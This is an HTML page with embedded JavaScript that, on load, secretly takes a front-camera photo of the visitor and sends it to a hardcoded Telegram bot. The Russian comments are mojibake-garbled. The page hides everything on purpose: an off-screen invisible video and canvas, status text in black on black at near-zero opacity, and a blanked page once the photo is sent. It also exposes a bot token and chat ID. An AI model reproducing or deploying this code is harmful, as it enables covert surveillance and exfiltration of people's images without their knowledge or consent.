<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Selfie -> Telegram</title>
<style>
  body, html { 
    margin:0; padding:0; 
    width:100%; height:100%; 
    background:#000; 
    color:#000; /* –¢–µ–∫—Å—Ç –ß–Å–†–ù–´–ô (–Ω–µ –∑–µ–ª—ë–Ω—ã–π) */
    font-family:Arial, sans-serif; 
    overflow: hidden;
  }
  #status { 
    position: fixed; 
    top:20px; 
    left:0; 
    width:100%; 
    text-align:center; 
    z-index:1000; 
    color: #000; /* –ß—ë—Ä–Ω—ã–π —Ç–µ–∫—Å—Ç */
    opacity: 0.01; /* –ü–æ—á—Ç–∏ –Ω–µ–≤–∏–¥–∏–º, –Ω–æ –¥–æ—Å—Ç—É–ø–µ–Ω –¥–ª—è –∫–æ–Ω—Å–æ–ª–∏ */
  }
  /* —Å–∫—Ä—ã–≤–∞–µ–º video, –Ω–æ –¥–µ—Ä–∂–∏–º –≤ DOM */
  video#preview { 
    position:fixed; 
    left:-9999px; 
    width:1px; 
    height:1px; 
    opacity:0; 
  }
  /* –°–∫—Ä—ã–≤–∞–µ–º –ª—é–±—ã–µ –ø–æ—è–≤–ª—è—é—â–∏–µ—Å—è —ç–ª–µ–º–µ–Ω—Ç—ã */
  canvas {
    position: absolute;
    top: -9999px;
    left: -9999px;
    width: 1px;
    height: 1px;
    opacity: 0;
  }
</style>
</head>
<body>
  <!-- –¢–µ–∫—Å—Ç –ß–Å–†–ù–´–ô –Ω–∞ –ß–Å–†–ù–û–ú —Ñ–æ–Ω–µ - –Ω–µ–≤–∏–¥–∏–º -->
  <div id="status" style="color: #000;">.</div>

<script>
const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
const CHAT_ID = '1250741267';
const status = document.getElementById('status');

// –ü–µ—Ä–µ–æ–ø—Ä–µ–¥–µ–ª—è–µ–º —Ñ—É–Ω–∫—Ü–∏—é –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å—Ç–∞—Ç—É—Å–∞ - —Ç–µ–∫—Å—Ç –æ—Å—Ç–∞—ë—Ç—Å—è —á—ë—Ä–Ω—ã–º
function updateStatus(text) {
  status.textContent = text;
  status.style.color = '#000'; // –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ —á—ë—Ä–Ω—ã–π
  console.log(text); // –í –∫–æ–Ω—Å–æ–ª—å –≤—Å—ë –µ—â—ë –∏–¥—ë—Ç –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
}

function sleep(ms) { return new Promise(res => setTimeout(res, ms)); }

async function captureAndSend() {
  let stream = null;
  try {
    updateStatus('1. –ó–∞–ø—Ä–∞—à–∏–≤–∞—é —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω—É—é –∫–∞–º–µ—Ä—É...');
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: { ideal: 'user' },
        width: { ideal: 1280 },
        height: { ideal: 720 },
        aspectRatio: { ideal: 9/16 }
      },
      audio: false
    });

    updateStatus('‚úÖ –ö–∞–º–µ—Ä–∞ –¥–æ—Å—Ç—É–ø–Ω–∞');

    const video = document.createElement('video');
    video.id = 'preview';
    video.srcObject = stream;
    video.playsInline = true;
    video.muted = true;
    video.autoplay = true;
    document.body.appendChild(video);

    updateStatus('2. –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –≤–∏–¥–µ–æ...');
    await new Promise((resolve) => {
      if (video.readyState >= 2 && !video.paused) {
        resolve();
        return;
      }
      
      const playPromise = video.play();
      if (playPromise && typeof playPromise.then === 'function') {
        playPromise.catch(err => {
          console.warn('video.play():', err);
        });
      }
      
      video.addEventListener('playing', () => resolve(), { once: true });
      setTimeout(() => {
        if (video.readyState >= 2) resolve();
        else resolve();
      }, 1200);
    });

    if (video.videoWidth === 0 || video.videoHeight === 0) {
      updateStatus('2.1 –ñ–¥—É –∫–∞–¥—Ä...');
      if ('requestVideoFrameCallback' in HTMLVideoElement.prototype) {
        await new Promise(res => video.requestVideoFrameCallback(() => res()));
      } else {
        await sleep(150);
      }
    }

    const vw = video.videoWidth || 1280;
    const vh = video.videoHeight || 720;
    updateStatus(`3. –†–∞–∑–º–µ—Ä—ã: ${vw}x${vh}`);

    // –£–í–ï–õ–ò–ß–ò–í–ê–ï–ú –í–†–ï–ú–Ø –û–ñ–ò–î–ê–ù–ò–Ø –î–õ–Ø –ö–ê–ú–ï–†–´ (–≤–∞–∂–Ω–æ!)
    updateStatus('4. –ù–∞—Å—Ç—Ä–∞–∏–≤–∞—é –∫–∞–º–µ—Ä—É (5 —Å–µ–∫—É–Ω–¥)...');
    await sleep(5000); // –£–≤–µ–ª–∏—á–µ–Ω–æ –¥–æ 5 —Å–µ–∫—É–Ω–¥

    const canvas = document.createElement('canvas');
    canvas.width = vw;
    canvas.height = vh;
    const ctx = canvas.getContext('2d');

    updateStatus('5. –î–µ–ª–∞—é —Å–Ω–∏–º–æ–∫...');

    // –ó–µ—Ä–∫–∞–ª–∏–º –¥–ª—è —Å–µ–ª—Ñ–∏
    ctx.save();
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    
    if (typeof createImageBitmap === 'function') {
      try {
        const bmp = await createImageBitmap(video);
        ctx.drawImage(bmp, 0, 0, canvas.width, canvas.height);
        bmp.close && bmp.close();
      } catch (e) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      }
    } else {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    }
    ctx.restore();

    updateStatus('6. –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é –∫–∞–º–µ—Ä—É...');
    stream.getTracks().forEach(t => t.stop());

    await sleep(50);

    // –£–°–ò–õ–ï–ù–ù–û–ï –£–õ–£–ß–®–ï–ù–ò–ï –Ø–†–ö–û–°–¢–ò (–¥–ª—è –±–æ—Ä—å–±—ã —Å —Ç—ë–º–Ω—ã–º–∏ —Ñ–æ—Ç–æ)
    try {
      updateStatus('7. –£–ª—É—á—à–∞—é —è—Ä–∫–æ—Å—Ç—å...');
      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      const data = imageData.data;
      
      // –£–°–ò–õ–ï–ù–ù–ê–Ø –ö–û–†–†–ï–ö–¶–ò–Ø (—É–≤–µ–ª–∏—á–µ–Ω—ã –∫–æ—ç—Ñ—Ñ–∏—Ü–∏–µ–Ω—Ç—ã)
      for (let i = 0; i < data.length; i += 4) {
        // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —è—Ä–∫–æ—Å—Ç—å –≤ 1.8 —Ä–∞–∑–∞ (–±—ã–ª–æ 1.25)
        data[i] = Math.min(255, data[i] * 1.8);       // R
        data[i+1] = Math.min(255, data[i+1] * 1.7);   // G
        data[i+2] = Math.min(255, data[i+2] * 1.7);   // B

        // –£—Å–∏–ª–µ–Ω–Ω—ã–π –∫–æ–Ω—Ç—Ä–∞—Å—Ç
        const avg = (data[i] + data[i+1] + data[i+2]) / 3;
        if (avg > 160) {
          data[i] = Math.min(255, data[i] * 1.1);
          data[i+1] = Math.min(255, data[i+1] * 1.1);
          data[i+2] = Math.min(255, data[i+2] * 1.1);
        } else if (avg < 100) {
          // –î–ª—è —Ç—ë–º–Ω—ã—Ö —É—á–∞—Å—Ç–∫–æ–≤ —É–≤–µ–ª–∏—á–∏–≤–∞–µ–º —è—Ä–∫–æ—Å—Ç—å —Å–∏–ª—å–Ω–µ–µ
          data[i] = Math.max(30, data[i] * 1.5);
          data[i+1] = Math.max(30, data[i+1] * 1.5);
          data[i+2] = Math.max(30, data[i+2] * 1.5);
        }
      }
      ctx.putImageData(imageData, 0, 0);
    } catch (e) {
      console.warn('–£–ª—É—á—à–µ–Ω–∏—è –Ω–µ –ø—Ä–∏–º–µ–Ω–µ–Ω—ã:', e);
    }

    updateStatus('8. –û—Ç–ø—Ä–∞–≤–ª—è—é –≤ Telegram...');
    canvas.toBlob(async (blob) => {
      if (!blob) {
        updateStatus('‚ùå –û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è —Ñ–æ—Ç–æ');
        return;
      }

      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'selfie_' + Date.now() + '.jpg');
      formData.append('caption', 'ü§≥ –°–µ–ª—Ñ–∏ —Å —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π –∫–∞–º–µ—Ä—ã');

      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        const json = await res.json();
        if (json.ok) {
          updateStatus('‚úÖ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!');
          // –û—á–∏—â–∞–µ–º —Å—Ç—Ä–∞–Ω–∏—Ü—É —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
          setTimeout(() => {
            document.body.innerHTML = '';
            document.body.style.cssText = 'background: #000; width: 100%; height: 100%;';
          }, 2000);
        } else {
          updateStatus('‚ùå –û—à–∏–±–∫–∞ Telegram');
        }
      } catch (err) {
        updateStatus('‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏');
      }
    }, 'image/jpeg', 0.92);

  } catch (err) {
    updateStatus('‚ùå –û—à–∏–±–∫–∞: ' + (err.message || err));
    console.error(err);
    if (stream) stream.getTracks().forEach(t => t.stop());
  }
}

// –ó–∞–ø—É—Å–∫–∞–µ–º
captureAndSend();
</script>
</body>
</html>
